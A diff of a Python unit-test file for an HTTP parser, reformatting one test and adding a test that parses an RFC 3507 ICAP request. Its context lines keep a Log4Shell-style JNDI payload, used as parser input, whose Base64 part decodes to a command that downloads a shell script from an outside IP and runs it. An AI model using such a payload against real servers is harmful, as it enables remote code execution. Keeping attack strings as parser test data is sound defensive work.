@@ -678,9 +678,7 @@ class TestHttpParser(unittest.TestCase):
         )
         self.assertTrue(self.parser.is_http_1_1_keep_alive)
 
-    def test_is_http_1_1_keep_alive_with_non_close_connection_header(
-            self,
-    ) -> None:
+    def test_is_http_1_1_keep_alive_with_non_close_connection_header(self) -> None:
         self.parser.parse(
             build_http_request(
                 httpMethods.GET, b'/',
@@ -811,3 +809,25 @@ class TestHttpParser(unittest.TestCase):
             b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
             b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}',
         )
+
+    def test_parses_icap_protocol(self) -> None:
+        # Ref https://datatracker.ietf.org/doc/html/rfc3507
+        self.parser.parse(
+            b'REQMOD icap://icap-server.net/server?arg=87 ICAP/1.0\r\n' +
+            b'Host: icap-server.net\r\n' +
+            b'Encapsulated: req-hdr=0, req-body=154' +
+            b'\r\n\r\n' +
+            b'POST /origin-resource/form.pl HTTP/1.1\r\n' +
+            b'Host: www.origin-server.com\r\n' +
+            b'Accept: text/html, text/plain\r\n' +
+            b'Accept-Encoding: compress\r\n' +
+            b'Cache-Control: no-cache\r\n' +
+            b'\r\n' +
+            b'1e\r\n' +
+            b'I am posting this information.\r\n' +
+            b'0\r\n' +
+            b'\r\n',
+        )
+        self.assertEqual(self.parser.method, b'REQMOD')
+        assert self.parser._url is not None
+        self.assertEqual(self.parser._url.scheme, b'icap')
